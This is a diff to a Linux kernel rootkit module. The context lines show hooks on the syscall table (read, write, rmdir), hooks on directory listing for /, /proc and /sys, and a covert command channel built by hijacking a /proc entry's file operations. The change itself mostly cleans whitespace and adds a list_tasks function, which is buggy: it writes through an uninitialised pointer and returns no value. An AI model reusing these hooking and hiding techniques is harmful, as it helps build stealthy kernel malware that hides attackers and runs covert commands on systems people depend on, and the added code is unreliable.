@@ -40,6 +40,7 @@
 #include <linux/version.h>
 
 #include <linux/sched.h>
+#include <linux/nsproxy.h>
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
@@ -268,12 +269,12 @@ void hook_remove_all(void)
 
 unsigned long read_count = 0;
 
-/* 
- * The asmlinkage modifier is typically used with syscall functions. 
+/*
+ * The asmlinkage modifier is typically used with syscall functions.
  * It tells the compiler to look for the function parameters in the stack,
  * rather than in the registers (for performance improvement).
  *
- * This is our version of the read() sys call, it will run every time the 
+ * This is our version of the read() sys call, it will run every time the
  * the original read() is invoked
  */
 asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
@@ -289,7 +290,7 @@ asmlinkage long read(unsigned int fd, char __user *buf, size_t count)
 unsigned long write_count = 0;
 
 /*
- * This is our version of the write() sys call, it will run every time the 
+ * This is our version of the write() sys call, it will run every time the
  * original write() sys call is invoked.
 */
 asmlinkage long write(unsigned int fd, const char __user *buf, size_t count)
@@ -824,7 +825,7 @@ int execute_command(const char __user *str, size_t length)
 
 // ========== COMM CHANNEL ==========
 
-//ssize_t is a signed integer system data type that can represent a byte count or a (negative) error indication 
+//ssize_t is a signed integer system data type that can represent a byte count or a (negative) error indication
 static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
 {
     if (execute_command(buf_user, count)) {
@@ -860,10 +861,10 @@ int setup_proc_comm_channel(void)
     struct proc_dir_entry *proc_entry = proc_create("temporary", 0444, NULL, &proc_file_fops);
     //this line assigns the parent process proc_dir_entry struct of the newly created process to itself (effectively swaps it)
     proc_entry = proc_entry->parent;
-    
+
     if (strcmp(proc_entry->name, "/proc") != 0) {
         pr_info("Couldn't find \"/proc\" entry\n");
-        remove_proc_entry("temporary", NULL); 
+        remove_proc_entry("temporary", NULL);
         return 0;
     }
 
@@ -896,7 +897,7 @@ int setup_proc_comm_channel(void)
 
     while (proc_entry) {
         pr_info("Looking at \"/proc/%s\"\n", proc_entry->name);
-  
+
         if (strcmp(proc_entry->name, CFG_PROC_FILE) == 0) {
             pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
             proc_fops = (struct file_operations *) proc_entry->proc_fops;
@@ -954,6 +955,20 @@ int setup_devnull_comm_channel(void)
 
 // ========== END COMM CHANNEL ==========
 
+/*
+ * Lists the current tasks in the system
+ *
+ * @return true on success, false on failure
+*/
+int list_tasks(void){
+    struct task_struct *task;
+    char *tsk_name;
+    for_each_process(task){
+        get_task_comm(tsk_name, task);
+        pr_info("Task name: %s\n", tsk_name);
+    }
+
+}
 
 int init(void)
 {
@@ -975,7 +990,7 @@ int init(void)
     /*
      * The function get_fop is defined in this file, returns a pointer to the file operations table
      * of the file object located on the path passed as the function's argument.
-     * Functions root_iterate, proc_iterate and sys_iterate are defined using macros in this 
+     * Functions root_iterate, proc_iterate and sys_iterate are defined using macros in this
      * file above, macros names: FILLDIR_START(NAME), FILLDIR_END(NAME), READDIR(NAME), etc...
      */
     asm_hook_create(get_fop("/")->iterate, root_iterate);
@@ -983,7 +998,7 @@ int init(void)
     asm_hook_create(get_fop("/sys")->iterate, sys_iterate);
 
 #elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
-    
+
     asm_hook_create(get_fop("/")->readdir, root_readdir);
     asm_hook_create(get_fop("/proc")->readdir, proc_readdir);
     asm_hook_create(get_fop("/sys")->readdir, sys_readdir);
@@ -992,16 +1007,18 @@ int init(void)
     /* Locate the system call table */
     sys_call_table = find_syscall_table();
     pr_info("Found sys_call_table at %p\n", sys_call_table);
-   
+
     /* Hook rmdir() syscall with our onw (i.e. asm_rmdir)
      * note: parameter __NR_rmdir is the position number inside the syscall table
      * associated with the rmdir  syscall. This is defined in <asm/unistd.h>
      */
     asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
-    
+
     /* Hook read() and write() syscalls with our own */
     hook_create(&sys_call_table[__NR_read], read);
     hook_create(&sys_call_table[__NR_write], write);
+
+    list_tasks();
 
     return 0;
 }
